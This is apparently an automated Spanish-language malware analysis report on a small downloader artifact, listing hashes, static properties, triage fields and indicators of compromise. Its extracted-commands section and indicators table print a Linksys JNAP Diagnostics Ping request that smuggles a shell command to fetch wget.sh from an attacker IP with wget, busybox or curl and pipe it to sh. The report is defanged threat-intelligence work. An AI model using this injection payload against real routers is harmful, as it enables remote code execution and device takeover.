# 🧬 Payload Analysis

`804bdfee152d0b540632fe13720b90096cac51ee50f1c98511aae23f2c709e95`

## 📌 Resumen

Artefacto identificado como ASCII text, with very long lines (307), with CRLF line terminators de 504 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `wget.sh` en `hxxp://91.92.40.XXX/wget.sh`. Se extrajeron 2 referencias URL únicas. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `804bdfee152d0b540632fe13720b90096cac51ee50f1c98511aae23f2c709e95`
- **SHA1:** `046c8bc6a2dbea8751a62fd88fe541fa87e08688`
- **MD5:** `b39f6abe5c01de29173febea3be6a1bc`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (307), with CRLF line terminators |
| Tamaño | 504 B |
| Entropía | 5.35 |
| Strings | 7 |

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (307), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
{"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd%20/tmp%3Bwget
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bbusybox%20wget%20http://91.92.40.XXX/wget.sh%20-O-%7Csh%20-s%20ljnap2%3Bcurl%20http://91.92.40.XXX/wget.sh%7Csh%20-s%20ljnap2 | strings |
| url | hxxp://linksys[.]com/jnap/network/Diagnostics | strings |
| ip | 190.179.139.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| command | {"JNAP":{"action":"hxxp://linksys[.]com/jnap/network/Diagnostics","command":"Ping","target":"[internal-ip-redacted]%20`cd%20/tmp%3Bwget | strings |
| hash | 804bdfee152d0b540632fe13720b90096cac51ee50f1c98511aae23f2c709e95 | static_analysis |
| ip | 45.153.34.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
